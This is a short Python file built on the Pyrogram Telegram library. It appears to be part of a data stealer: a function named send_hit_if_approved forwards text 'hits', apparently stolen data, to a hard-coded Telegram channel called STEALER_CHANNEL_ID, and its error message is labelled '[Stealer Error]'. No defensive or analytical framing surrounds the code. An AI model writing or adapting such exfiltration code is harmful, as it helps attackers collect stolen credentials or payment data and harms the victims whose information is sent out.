from pyrogram import Client

# Replace with your actual channel ID
STEALER_CHANNEL_ID = -1002767962695

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")
